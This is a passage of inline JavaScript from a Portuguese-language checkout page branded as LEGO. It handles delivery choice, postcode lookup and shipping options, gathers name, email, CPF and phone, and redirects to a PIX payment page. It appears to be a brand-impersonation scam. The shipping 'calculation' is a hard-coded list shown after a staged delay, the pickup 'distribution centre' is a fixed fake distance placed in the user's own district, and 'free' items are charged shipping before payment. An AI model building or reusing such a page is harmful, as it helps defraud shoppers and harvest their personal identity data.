            if (!selectedShipping && deliveryMethod === 'RECEBER') {
                showToast('Por favor, selecione uma opção de entrega.', 'error');
                return;
            }
            
            if (deliveryMethod === 'RETIRAR' && !formData.pickupDate) {
                showToast('Por favor, selecione uma data para retirada.', 'error');
                return;
            }
            
            // Preparar dados para envio
            const orderData = {
                nome: `${formData.firstName} ${formData.lastName}`,
                email: formData.email,
                cpf: formData.cpf,
                telefone: formData.phone,
                valor: productData.finalPrice + (deliveryMethod === 'RETIRAR' ? 0 : (selectedShipping?.price || 0)),
                produto: productData,
                entrega: selectedShipping,
                metodoEntrega: deliveryMethod,
                dataRetirada: formData.pickupDate,
                utmParams: getUtmParams()
            };
            
            console.log('Dados do pedido:', orderData);
            
            // Salvar no localStorage para a página PIX
            localStorage.setItem('orderData', JSON.stringify(orderData));
            
            // Limpar dados do formulário após finalizar
            localStorage.removeItem('checkoutFormData');
            
            // Redirecionar para página PIX
            window.location.href = '/pix.html';
        });

        document.getElementById('calculateBtn').addEventListener('click', async function() {
            const cep = document.getElementById('cep').value.replace(/\D/g, '');
            const cepError = document.getElementById('cepError');
            
            if (cep.length !== 8) {
                cepError.textContent = 'CEP deve ter 8 dígitos';
                cepError.classList.remove('hidden');
                return;
            }
            
            cepError.classList.add('hidden');
            
            const btn = this;
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<div class="loading-spinner mx-auto"></div>';
            btn.disabled = true;
            
            try {
                // Buscar endereço via API
                const addressData = await getAddressFromCep(cep);
                if (addressData) {
                    formData.fullAddress = addressData.fullAddress;
                    formData.district = addressData.district;
                    formData.city = addressData.city;
                    formData.state = addressData.state;
                    formData.street = addressData.street;
                }
                
                setTimeout(() => {
                    let shippingOptions = [];
                    
                    if (deliveryMethod === 'RETIRAR') {
                        // Verificar se produto é gratuito
                        if (hasOnlyFreeItems()) {
                            showTemporaryNotification();
                            btn.innerHTML = originalHTML;
                            btn.disabled = false;
                            return;
                        }
                        
                        // Opção específica para retirada
                        shippingOptions = [{
                            type: 'Centro de Distribuição LEGO',
                            distance: '3.1km',
                            address: `📍 ${addressData?.district || 'Centro'}`,
                            price: 0,
                            isStore: true
                        }];
                    } else {
                        // Opções para entrega baseadas no produto
                        if (hasOnlyFreeItems()) {
                            shippingOptions = [
                                { type: 'Correios PAC', days: 'de 5-7 dias úteis', price: 25.91 }
                            ];
                        } else {
                            shippingOptions = [
                                { type: 'Correios PAC', days: 'de 5-7 dias úteis', price: 0 },
                                { type: 'JadLog Transportadora', days: 'Chegará amanhã', price: 25.91 }
                            ];
                        }
                    }
                    
                    const shippingList = document.getElementById('shippingList');
                    shippingList.innerHTML = '';
                    
                    if (deliveryMethod === 'RETIRAR') {
                        const storeOption = shippingOptions[0];
                        const storeEl = document.createElement('div');
                        storeEl.className = 'animate-fade-in';
                        storeEl.innerHTML = `
                            <button id="storeSelectionBtn" class="w-full flex justify-between items-center p-3 border rounded-lg transition-colors border-gray-200 hover:border-gray-300">
                                <div class="text-left">
                                    <p class="font-medium">${storeOption.type}</p>
                                    <p class="text-sm text-gray-600">${storeOption.distance}</p>
                                    <p class="text-xs text-gray-500">${storeOption.address}</p>
                                </div>
                                <p class="font-semibold text-green-600">Grátis</p>
                            </button>
                        `;
                        
                        shippingList.appendChild(storeEl);
                        
                        document.getElementById('storeSelectionBtn').addEventListener('click', function() {
                            selectedShipping = storeOption;
                            this.classList.add('border-green-500', 'bg-green-50');
                            this.classList.remove('border-gray-200', 'hover:border-gray-300');
                            
                            showCalendar();
                            document.getElementById('continueAddressBtn').disabled = false;
                        });
                    } else {
                        // Interface normal para entrega
                        shippingOptions.forEach((option, index) => {
                            const optionEl = document.createElement('label');
                            optionEl.className = 'flex items-center gap-3 p-3 border rounded-lg cursor-pointer hover:bg-gray-50 animate-fade-in';
                            optionEl.innerHTML = `
                                <input type="radio" name="shipping" value="${index}" class="w-4 h-4 text-blue-600">
                                <div class="flex-1">
                                    <p class="font-medium text-sm">${option.type}</p>
                                    <p class="text-xs text-gray-600">${option.days}</p>
                                </div>
                                <p class="font-semibold text-sm">
                                    ${option.price === 0 ? 'Grátis' : `R$ ${option.price.toFixed(2).replace('.', ',')}`}
                                </p>
                            `;
                            
                            optionEl.addEventListener('change', function() {
                                selectedShipping = option;
                                document.getElementById('continueAddressBtn').disabled = false;
                                document.getElementById('addressDetails').classList.remove('hidden');
                            });
                            
                            shippingList.appendChild(optionEl);
                        });
                    }
                    
                    const shippingOptionsEl = document.getElementById('shippingOptions');
                    shippingOptionsEl.style.opacity = '0';
                    shippingOptionsEl.classList.remove('hidden');
                    
                    // Animação fade-in
                    setTimeout(() => {
                        shippingOptionsEl.style.transition = 'opacity 0.5s ease-in-out';
                        shippingOptionsEl.style.opacity = '1';
                    }, 50);
                    
                    btn.innerHTML = originalHTML;
                    btn.disabled = false;
                    
                }, 1500);
                
            } catch (error) {
                console.error('Erro ao calcular frete:', error);
                showToast('Erro ao buscar informações do CEP. Tente novamente.', 'error');
                btn.innerHTML = originalHTML;
                btn.disabled = false;
            }
        });

        document.getElementById('receberBtn').addEventListener('click', function() {
            deliveryMethod = 'RECEBER';
            this.classList.add('bg-blue-600', 'text-white');
            this.classList.remove('text-gray-600');
            document.getElementById('retirarBtn').classList.remove('bg-blue-600', 'text-white');
            document.getElementById('retirarBtn').classList.add('text-gray-600');
            
            document.getElementById('shippingOptions').classList.add('hidden');
            document.getElementById('addressDetails').classList.add('hidden');
            const calendar = document.getElementById('pickupCalendar');
            if (calendar) calendar.remove();
            selectedShipping = null;
            document.getElementById('continueAddressBtn').disabled = true;
        });

        document.getElementById('retirarBtn').addEventListener('click', function() {
            if (hasOnlyFreeItems()) {
                showTemporaryNotification();
                return;
            }
            
            deliveryMethod = 'RETIRAR';
            this.classList.add('bg-blue-600', 'text-white');
            this.classList.remove('text-gray-600');
            document.getElementById('receberBtn').classList.remove('bg-blue-600', 'text-white');
            document.getElementById('receberBtn').classList.add('text-gray-600');
            
            document.getElementById('shippingOptions').classList.add('hidden');
            document.getElementById('addressDetails').classList.add('hidden');
            const calendar = document.getElementById('pickupCalendar');
            if (calendar) calendar.remove();
            selectedShipping = null;
            document.getElementById('continueAddressBtn').disabled = true;
        });

        function setupMasks() {
            const cpfField = document.getElementById('cpf');
            const phoneField = document.getElementById('phone');
            const cepField = document.getElementById('cep');
            
            cpfField.addEventListener('input', function(e) {
                e.target.value = maskCPF(e.target.value);
            });
            
            phoneField.addEventListener('input', function(e) {
                e.target.value = maskPhone(e.target.value);
            });
            
            cepField.addEventListener('input', function(e) {
                e.target.value = maskCEP(e.target.value);
            });
        }

        function setupCalendar() {
            document.getElementById('retirarBtn').addEventListener('click', function() {
                if (hasOnlyFreeItems()) {
                    showTemporaryNotification();
                    return;
                }
            });
        }

        document.addEventListener('DOMContentLoaded', function() {
            productData = getProductData();
            if (!productData) return;
            
            // Carregar dados salvos do formulário
            loadFormData();
            
            // Atualizar resumo inicial
            updatePaymentSummary();
            
            // Configurar máscaras
            setupMasks();
            
            // Configurar calendário
            setupCalendar();
            
            console.log('✅ LEGO Checkout Multi-Step carregado');
            console.log('📊 UTM Params:', getUtmParams());
            
            console.log('🛍️ Dados do produto:', productData);
            
            goToStep('email');
        });
    </script>
</body>
</html>
